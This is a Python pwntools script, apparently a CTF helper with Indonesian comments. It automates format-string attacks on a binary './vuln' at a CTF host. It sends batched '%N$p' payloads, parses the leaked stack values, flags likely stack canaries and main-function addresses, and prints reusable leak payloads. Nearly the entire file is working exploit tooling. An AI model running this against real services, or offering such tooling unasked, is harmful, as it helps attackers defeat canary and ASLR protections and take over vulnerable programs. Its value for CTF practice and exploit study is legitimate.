
# Open source tools 
# by Rev
# python only
# how to use ada di README.md
# CUKUP GANTI BAGIAN [ target Segment ] 
# V 0.4

import shutil
import sys
from pwn import *


global BINARY 

#=====[ Target Segment ]=====#
SERV = 'thpctf.th'
PORT = 6767
BINARY = './vuln'  # RECOMENDED pake binary agar ga lag 

TOINDEX = 64
BATCH = 2     # <-- bebas diatur

INPUT_AFTER = b':' # <- pasang karakter terakhir sebelum input
#============================#

elf = context.binary = ELF(BINARY)
REMOTE = True

def start():
    global REMOTE
    if args.LOCAL or not REMOTE:
        p = process(BINARY,level='critical')
    else:
        try:
            p = remote(SERV,PORT)
        except Exception as e:
            REMOTE = False
            p = process(BINARY)
            log.warn("Cannot remote server...trying local.")
    return p


def indexl():
    main = hex(elf.sym.main)
    global TOINDEX, BATCH

    line = 0
    info_log = ''
    err_count = 0
    leak_count = 0

    payload = ''
    log = ''
    leaked = ''
    p_c = 0
    sent_history = []

    leaked += f'\n{text.bold_red(section_title("[ LEAK ADDRESS ]"))}\n'
    log += f'\n{text.bold_red(section_title("[ LEAKED ]"))}'
    log += f'\n{"":<5}{"TIPE":<12}{"INDEX":<20}{"ADDRESS":<20}{"STRING"}\n'

    half = TOINDEX // 2


    for group_start in range(1, half + 1, BATCH):
        group_indices = list(range(group_start, min(group_start + BATCH, half + 1)))

        parts = []
        for idx in group_indices:
            parts.append(f"%{idx}$p")
            parts.append(f"%{idx + half}$p")
        pay = "DD" + ":".join(parts)

        p_c += 1
        batch_size, hex_batch_size = size_payload(pay)
        sent_history.append(int(batch_size))
        #info_log += f'\nProcess [{p_c}] Sent {text.bold_green(batch_size)} | {text.bold_green(hex_batch_size)} Bytes'
        # aktifkan untuk melihat byte per batch 


        p = start()
        p.recvuntil(INPUT_AFTER)
        p.sendline(pay.encode())
        p.recvuntil(b'DD')

        try:
            rax = p.recvline().strip().decode().split(':')


            for k, idx in enumerate(group_indices):
                l_indx = l_val = l_str = None
                r_indx = r_val = r_str = None

                try:
                    leak = int(rax[2*k], 16)
                except (ValueError, IndexError):
                    err_count += 1
                    leak = None

                try:
                    leak1 = int(rax[2*k+1], 16)
                except (ValueError, IndexError):
                    err_count += 1
                    leak1 = None

                if leak is not None:
                    l_indx = f'idx {idx:<5}'
                    l_val  = f'{hex(leak):<20}'
                    l_str  = to_printable(leak)
                    

                if leak1 is not None:
                    r_indx = f'idx {idx+half:<5}'
                    r_val  = f'{hex(leak1):<20}'
                    r_str  = to_printable(leak1)
                    

                NIL_STR = '.'*8
                l_indx_disp = l_indx if l_indx is not None else f'idx {idx:<5}'
                l_val_disp  = l_val  if l_val  is not None else f'{"N/A":<20}'
                l_str_disp  = l_str  if l_str  is not None else NIL_STR

                r_indx_disp = r_indx if r_indx is not None else f'idx {idx+half:<5}'
                r_val_disp  = r_val  if r_val  is not None else f'{"N/A":<20}'
                r_str_disp  = r_str  if r_str  is not None else NIL_STR

                l_side = f'{text.bold_green(l_indx_disp)}{text.bold_yellow(l_val_disp)}'
                r_side = f'{text.bold_green(r_indx_disp)}{text.bold_yellow(r_val_disp)}'

                string = f'{text.bold_cyan(l_str_disp)} | {text.bold_cyan(r_str_disp)}'
                leaked += f'\n{l_side} {"|":<2} {r_side} {"|":<2} {string}'
                line += 1

                
                for val, i_ in ((leak, idx), (leak1, idx + half)):
                    if val is not None:
                        log_entry, payload_entry = filtering(val, i_)
                        if log_entry:
                            log += log_entry
                        if payload_entry:
                            payload += payload_entry
                            

        except Exception as e:
            p.close()
            err_count += 1
            # info_log += f'\nerror at {idx}: {e}' #for debugging

        p.close()
    log += f'\n{text.bold_red(section_title("[ PAYLOAD ]"))}'
    log += f'\n{text.bold_green("LOG PAYLOAD :")}'
    log += f'\n{text.bold_yellow(payload)}'
    
    log += f'\n{text.bold_green("SPAM PAYLOAD :")}'
    log += f'\n{f_payload(TOINDEX)}'
    log += f'\n{text.bold_red(section_title("[ LOG ]"))}'


    leak_count = TOINDEX - err_count

    l_d = text.bold_green(str(leak_count))
    i_d = text.bold_red(str(err_count))
    lss_d = text.bold_red(str(leak_count-line*2))
    # line_c = text.bold_cyan(str(line))
    p_d = text.bold_cyan(str(line*2))


    if leak_count-line*2 <= 0:
        lss_d = text.bold_green('no loss index')

    if leak_count <= err_count:
        temp_log = f'\n[!!] jumlah error terlalu banyak, coba turunkan ukuran batch.'
    else:
        temp_log = None
        

    temp_pay = b_payload(TOINDEX)
    byte,h_byte = size_payload(temp_pay)
    avg_sent = str(sent_stats(sent_history))

    info_log += f'\n\nByte Sent : {text.bold_cyan(byte)} [{h_byte}] Bytes'
    info_log += f'\nAvg sent/ Process : {text.bold_cyan(avg_sent)} [{hex(int(avg_sent))}] Bytes'
    info_log += f'\n\nMax Index {text.bold_green(str(TOINDEX))}, batch : {text.bold_green(str(BATCH))}\n'
    info_log += f'\nLeaked {l_d}, not hex {i_d}\nprinted {p_d} index, loss index = {lss_d}'
    if temp_log is not None:
        info_log += f'{text.bold_red(temp_log)}'
    info_log += f'\n'

    print(leaked)
    print(log)
    print(info_log)
    


def filtering(leak,i):
    log_entry = ""
    payload_entry = ""
    leak_hex = hex(leak)

    #==========[ CANARY ]==========#
    if elf.canary and leak_hex.endswith('00') and len(leak_hex) >= 16:
        log_entry += f"\n{'':<2}{text.red('canary'):<23}{i:<15}{text.bold_yellow(leak_hex)}"
        payload_entry += f'%{i}$p.'

    #==========[ MAIN ]==========#
    if leak_hex.endswith(hex(elf.sym.main)[-3:]):
        log_entry += f"\n{'':<2}{text.blue('est. main'):<23}{i:<15}{text.bold_yellow(leak_hex)}{'':<10}{text.bold_cyan(hex(elf.sym.main))} (main)"
        payload_entry += f'%{i}$p.'

    #==========[ START IDX ]==========#
    if leak_hex.endswith('4444'):
        log_entry += f"\n{'':<2}{text.blue('start idx'):<23}{i:<15}{text.bold_yellow(leak_hex)}{'':<5}{unhex(leak_hex.replace('0x',''))}"
        payload_entry += f'%{i}$p.'

    #==========[ STACK ]============# masih tahap pengembangan
    # if leak_hex.startswith('0x7ff'):
    #     log_entry += f'\n{'':<2}{'stack':<23}{i:<15}{leak_hex}'

    return log_entry,payload_entry


def to_printable(value, size=8):
    raw = value.to_bytes(size, byteorder='little')
    return ''.join(chr(b) if 32 <= b <= 126 else '.' for b in raw)

def b_payload(i):
    payload = [f'%{i}$p' for i in range(i)]
    return "".join(payload)

def size_payload(p):
    b = len(p.encode())
    return str(b), str(hex(b))

def f_payload(to):
    pay = [f'.%p' for i in range(to//2)]
    for i,val in enumerate(pay):
        if i == to//4:
            pay.insert(to//4 ,f' [IDX-{(to//4)+1}] ->')
    return text.bold_yellow("".join(pay))

def sent_stats(history):
    if not history:
        return 0, 0, 0
    avg = sum(history) // len(history)
    return avg

def section_title(title, fillchar='─',width = None):
    if width == None:
        width = shutil.get_terminal_size(fallback=(80, 24)).columns
    labeled = f"[ {title} ]"
    return title.center(width, fillchar)



def main():
    p = log.progress('See Index Tools')
    p.status("indexing")
    indexl()
    start()

if __name__ == "__main__":
    main()
